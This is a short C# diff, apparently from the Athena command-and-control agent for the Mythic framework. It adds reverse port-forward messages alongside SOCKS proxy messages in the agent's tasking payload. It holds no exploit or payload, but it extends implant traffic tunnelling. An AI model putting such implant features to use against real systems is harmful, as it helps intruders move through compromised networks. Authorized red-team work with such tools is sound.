@@ -1,7 +1,8 @@
 ﻿using Athena.Commands;
-using Athena.Models.Athena.Commands;
-using Athena.Models.Mythic.Response;
+using Athena.Models.Commands;
+using Athena.Models.Comms.SMB;
 using Athena.Models.Mythic.Tasks;
+using Athena.Models.Proxy;
 using Athena.Utilities;
 using System.Collections.Concurrent;
 using System.Text.Json;
@@ -37,11 +38,13 @@ namespace Athena.Profiles.Forwarders.Models
         {
             Task<List<string>> responseTask = TaskResponseHandler.GetTaskResponsesAsync();
             Task<List<DelegateMessage>> delegateTask = DelegateResponseHandler.GetDelegateMessagesAsync();
-            Task<List<SocksMessage>> socksTask = SocksResponseHandler.GetSocksMessagesAsync();
-            await Task.WhenAll(responseTask, delegateTask, socksTask);
+            Task<List<MythicDatagram>> socksTask = ProxyResponseHandler.GetSocksMessagesAsync();
+            Task<List<MythicDatagram>> rpFwdTask = ProxyResponseHandler.GetRportFwdMessagesAsync();
+            await Task.WhenAll(responseTask, delegateTask, socksTask, rpFwdTask);
             List<string> responses = responseTask.Result;
             List<DelegateMessage> delegateMessages = delegateTask.Result;
-            List<SocksMessage> socksMessages = socksTask.Result;
+            List<MythicDatagram> socksMessages = socksTask.Result;
+            List<MythicDatagram> rpfwdMessages = rpFwdTask.Result;
 
             if (messages.Count > 0) //Checkin Message
             {
@@ -68,6 +71,7 @@ namespace Athena.Profiles.Forwarders.Models
                     delegates = delegateMessages,
                     socks = socksMessages,
                     responses = responses,
+                    rpfwd = rpfwdMessages,
                 };
 
                 string res = JsonSerializer.Serialize(gt, GetTaskingJsonContext.Default.GetTasking);
